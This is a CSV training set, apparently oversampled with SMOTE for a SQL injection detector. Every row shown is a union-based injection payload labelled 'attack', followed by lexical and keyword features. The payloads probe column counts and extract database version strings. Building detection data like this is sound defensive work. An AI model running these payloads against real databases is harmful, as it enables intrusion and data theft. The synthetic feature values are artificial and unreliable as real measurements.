id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000121,attack,union," select * from users where id  =  '1' union select \.,@@VERSION -- 1'",nearest_attack_euclidean,R000080,0.2856946261413412,68.81547739541922,31.815477395419215,4.421926339761484,40.0,2.0000000000000018,15.0,11.815477395419217,0.5813825428956368,0.029069127144781853,0.2180184535858638,0.17152987637371753,3.0,0.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0000000000000004,4.4077386977096085,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000122,attack,union,"1   )    )    as mgvw where 4923  =  4923 union all select null,null,null,null--",nearest_attack_euclidean,R000351,0.014929120663644933,80.00611492975145,25.987770140497112,3.8962095249746116,41.0,9.0,22.0,8.006114929751444,0.512461309858054,0.11249150704201188,0.2749792394360291,0.10006794366390494,0.006114929751444231,0.0,2.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,3.0,3.0,0.006114929751444231,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000123,attack,union," select * from users where id  =  1 <@.$ union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000021,1.029869719554206,79.13553254098058,28.892554234967633,4.01237531570465,41.514043387974105,2.6214891530064754,24.0,11.0,0.5243232166227851,0.03324937580113377,0.30337879376645555,0.13904861380962547,0.0,0.0,2.0,0.0,1.3785108469935263,1.0,0.0,2.0,0.0,0.0,1.0000000000000004,5.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000124,attack,union,"-8760"" union all select 2309,2309,2309,2309,2309,2309,2309,2309,2309#",nearest_attack_euclidean,R000180,0.4457266090336275,66.63482884804115,22.0,3.8276630912279965,14.0,38.10786307843293,4.0,10.526965769608232,0.21103227613053888,0.5708792430582721,0.060294936037296826,0.1577935447738922,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.526965769608232,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000125,attack,union,"-7858'  )   union all select 1541,1541,1541,1541,1541,1541#",nearest_attack_euclidean,R000169,0.011337307618940575,59.05914594809241,21.0,3.7708533798364945,14.0,28.047316758473926,8.0,9.011829189618481,0.23706884447211504,0.4748770132953851,0.13546791112692286,0.152586231105577,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,5.0118291896184815,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000126,attack,union," select * from users where id  =  1 or $+<$ union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000066,0.13913716122650205,73.0,32.0,4.372726918332265,42.0,3.0,17.0,11.0,0.5753424657534246,0.041095890410958874,0.2328767123287671,0.1506849315068493,0.0,0.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0000000000000004,5.776747745841486,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.9999999999999999,0.0,1.0000000000000002,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000127,attack,union," select * from users where id  =  1 +$ 1 union select null,@@VERSION -- 1",nearest_attack_euclidean,R000071,0.10367265741777337,73.0,31.14519649981554,4.3301272610497,44.0,2.8548035001844614,17.0,9.145196499815539,0.6027397260273972,0.03910689726280081,0.2328767123287671,0.12527666438103477,0.0,0.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0000000000000004,5.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000128,attack,union," select * from users where id  =  '1' or $ .  =  1 union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000015,0.011126435410267501,81.0,32.0,4.250112285986468,42.0,4.0,22.0,13.0,0.5185185185185185,0.04938271604938271,0.2716049382716049,0.16049382716049382,3.0,0.0,2.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,1.0000000000000004,5.017852899714848,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.9999999999999999,0.0,1.0000000000000002,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000129,attack,union,"1'  )   where 8628  =  8628 union all select null,null,null--",nearest_attack_euclidean,R000666,0.7568956500984564,59.04756802658065,22.34918934219355,3.8198254734704817,27.09513605316131,11.27783730232257,14.0,6.674594671096775,0.45523955005032474,0.19419372971757107,0.23765545383841158,0.11291126639369262,1.0,0.0,2.3254053289032246,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.3491893421935512,3.3254053289032246,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000130,attack,union,"-5131'   )    )     )   union all select 4854,4854,4854,4854,4854,4854,4854#",nearest_attack_euclidean,R000428,0.4901686695002305,78.31167155391691,21.46233431078338,3.6511410587765796,14.0,33.84933724313352,18.0,12.46233431078338,0.17895331355509475,0.4318674692580907,0.23008283171369326,0.1590963854731212,1.0,0.0,1.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,6.46233431078338,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000131,attack,union,"-5300' union all select 2750,2750,2750,2750,2750,2750--",nearest_attack_euclidean,R000287,0.08551748680190517,55.0,19.382189412055283,3.828800054853278,14.0,28.0,4.0,9.0,0.2545454545454545,0.509090909090909,0.07272727272727272,0.16363636363636364,1.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000132,attack,union,"-8760"" union all select 2309,2309,2309,2309,2309,2309,2309,2309,2309#",nearest_attack_euclidean,R000180,0.0,69.0,22.0,3.79602962359006,14.0,40.0,4.0,11.0,0.2028985507246377,0.5797101449275363,0.05797101449275363,0.15942028985507245,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000133,attack,union,"1'+  (  select 'zkum' where 5161  =  5161 union all select null,null,null,null#",nearest_attack_euclidean,R000749,0.2049370205246139,77.93154349576331,25.89315434957633,4.035428086085697,44.14523479661065,9.0,15.0,9.786308699152663,0.5660528511507783,0.11568815052983492,0.19281358421639155,0.12544541410299528,3.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,2.7863086991526624,2.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000134,attack,union,"-7746'  )   union all select 1998,1998,1998,1998,1998,1998,1998,1998#",nearest_attack_euclidean,R000293,0.15982465118958727,69.0,22.075475676784155,3.7545298607433923,14.0,36.0,8.0,11.0,0.2028985507246377,0.5217391304347826,0.11594202898550725,0.15942028985507245,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,7.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000135,attack,union,"-1244  )   as qszw where 2332  =  2332 union all select 2332,2332,2332,2332#",nearest_attack_euclidean,R000161,0.10142533314298083,75.58189180772456,25.167243276910177,3.825633156034218,25.0,27.665513446179645,16.0,6.916378361544911,0.33088448940083137,0.3658795499061092,0.21176607321653207,0.0914698874765273,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,2.9163783615449113,2.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000136,attack,union,"1'  )   union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000467,0.11787146070835079,65.62940403693676,16.0,3.1221583581180754,46.503523229549415,1.0,8.0,10.125880807387354,0.7085222910377189,0.015246284827046847,0.12197027861637491,0.15426114551885942,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,7.125880807387354,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000137,attack,union,"1%'  )   union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000202,0.9078849825360621,66.15089514601733,17.0,3.1946406838544195,46.12071611681387,1.0,8.0,11.030179029203467,0.6966118880149891,0.015204134115442774,0.12163307292354221,0.1665509049460259,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,7.030179029203468,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000138,attack,union,"1%'   )    )     )   union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000310,0.3055444915340709,71.40418396489808,17.0,3.1923224743006875,40.72334717191846,1.0,18.0,11.680836792979617,0.569651797569978,0.014045622099391586,0.2528211977890486,0.16348138254158187,1.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0,1.0,0.0,5.680836792979617,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000139,attack,union,"-5672'   )    )    union all select 9371,9371,9371,9371,9371,9371--",nearest_attack_euclidean,R000687,0.1632724387342764,67.23000830757383,22.172506230680376,3.8975390084375725,14.747526999614958,27.769991692426167,13.827493769319625,10.884995846213084,0.2188068515173783,0.41331705082625303,0.2058486370061764,0.16202746065019222,1.0,0.0,3.0,0.0,0.0,0.0,0.0,1.9424979231065416,0.0,0.0,4.942497923106542,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000140,attack,union,"1"" union all select null,null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000485,0.1596159764481709,69.1480845379464,15.0,2.9437154184037686,53.31846763035712,1.0,4.0,10.82961690758928,0.7709860179417904,0.014506991029104854,0.058027964116419306,0.1564790269126855,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.82961690758928,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000141,attack,union,"-4770   )    )     )   union all select 6356,6356,6356,6356,6356#",nearest_attack_euclidean,R000574,0.47990654410385275,67.48327156107901,20.7516728438921,3.633037134146082,14.0,25.986617248863205,18.0,9.496654312215801,0.20825316885023468,0.3834936622995307,0.267754074236016,0.14049909461421867,0.0,0.0,1.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,4.4966543122158,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000142,attack,union,"-7460"" union all select 4273,4273,4273,4273,4273,4273,4273,4273#",nearest_attack_euclidean,R000257,0.2655532017283523,65.40256986786945,21.28051397357389,3.791410097316424,14.0,37.122055894295556,4.0,10.28051397357389,0.21430344697686315,0.5673276861394057,0.06122955627910376,0.15713931060462738,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.280513973573891,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000143,attack,union,"-2207%'   )    )    union all select 3339,3339,3339,3339,3339,3339#",nearest_attack_euclidean,R000714,0.36223717496244867,68.03663939128067,22.207327878256134,3.6124318567970852,14.0,28.0,14.829311513024539,11.207327878256136,0.20594673476825673,0.4118934695365135,0.2174649502269309,0.16469484546829885,1.0,0.0,1.0,0.0,0.0,0.0,0.0,2.2073278782561347,1.0,0.0,5.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000144,attack,union,"-7041""   )    )     )   union all select 2159,2159,2159,2159,2159--",nearest_attack_euclidean,R000642,0.00012897985140800647,66.9995929861211,21.99991859722422,3.802479891263709,14.0,24.0,17.999674388896885,10.999918597224221,0.2089565956173097,0.3582113067725309,0.26865322828741245,0.16417886932274692,0.0,1.0,3.0,0.0,0.0,0.0,0.0,2.999918597224221,0.0,0.0,4.0,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000145,attack,union,"-1368   )    )    union all select 1310,1310,1310,1310,1310#",nearest_attack_euclidean,R000591,0.08510540635903215,59.610690001214266,20.077861999757147,3.6311429633187595,14.0,23.688552000971413,14.0,7.922138000242853,0.23498495151000007,0.3971686545542856,0.2349849515100001,0.13286144242571427,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,3.922138000242853,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000146,attack,union,"-1097"" where 4421  =  4421 union all select 4421,4421,4421,4421,4421#",nearest_attack_euclidean,R000737,0.18986234595768894,68.93972647464305,25.0,3.901342892174853,19.0,32.0,10.0,7.939726474643058,0.27560639321862357,0.46417918857873447,0.14505599643085454,0.1151584217717874,0.0,0.9397264746430571,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,4.0,2.0,0.0,0.939726474643057,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000147,attack,union," select * from users where id  =  1 -@<@ union select null,version  (    )   -- 1",nearest_attack_euclidean,R000110,0.1472715657285423,80.23297662561909,26.0,3.904353760377905,42.97730216749211,2.255674458126972,24.0,11.0,0.5354400924405858,0.02821204144619288,0.2992099653347803,0.13713790077844096,0.0,0.0,3.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0000000000000004,6.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000148,attack,union," select * from users where id  =  '1' union select +\,@@VERSION -- 1'",nearest_attack_euclidean,R000091,0.2590892586028887,69.0,32.0,4.430776364128054,40.0,2.0000000000000018,15.0,12.0,0.5797101449275363,0.028985507246376774,0.21739130434782608,0.17391304347826086,3.0,0.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0000000000000004,4.584278847566807,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000149,attack,union,"-3666""   )    )     )   union all select 4136,4136,4136--",nearest_attack_euclidean,R000254,0.8155317959018951,57.0,19.46853388765988,3.6794582314804387,14.0,17.87413555063953,16.12586444936047,9.0,0.24561403508771928,0.31358132544981626,0.28290990262035914,0.15789473684210525,0.0,1.0,3.0,0.0,0.0,0.0,0.0,2.5314661123401176,0.0,0.0,2.468533887659882,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000150,attack,union,"1"" where 4684  =  4684 union all select null,null,null,null#",nearest_attack_euclidean,R000503,0.33441040218589396,61.69908254754659,22.0,3.835768014041565,36.35926603803727,9.0,10.0,6.339816509509317,0.5889969418251553,0.1460790402748925,0.16231004474988053,0.10261397315007167,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,3.3398165095093173,1.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000151,attack,union,"-6253' union all select 5756,5756,5756,5756,5756,5756,5756,5756,5756,5756#",nearest_attack_euclidean,R000463,0.030167956658665163,73.84135374909519,20.03172925018096,3.386439368226254,14.0,43.87308299927616,4.0,11.96827074981904,0.18962417695116865,0.5941223221673027,0.054178336271762495,0.1620751646097663,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.96827074981904,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000152,attack,union," select * from users where id  =  1.  union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000067,0.016895908310355364,75.05769450713468,25.0,3.7949448734644946,40.115389014269375,2.971152746432656,23.971152746432654,8.0,0.534432276326375,0.03959538917074376,0.31938559096298125,0.1065867435399,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0000000000000004,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000153,attack,union,"1   )    )     )   union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000525,0.5371200983252601,75.12962306391641,15.217594234020897,3.056924976744008,45.12962306391641,1.0,18.0,11.0,0.6004913545170856,0.013316954849430462,0.23970518728974866,0.1464865033437353,0.2175942340208975,0.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,6.782405765979103,0.0,0.2175942340208975,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000154,attack,union,"1""  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000252,0.9513662851649596,56.91952724355056,16.0,3.268491403897988,36.160945512898884,1.0,10.758581730651676,9.0,0.6361055768064705,0.01757403717870981,0.18815405140643146,0.15816633460838825,0.0,1.0,2.0,0.0,0.0,0.0,0.0,1.4597636217752792,0.0,0.0,4.540236378224721,2.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
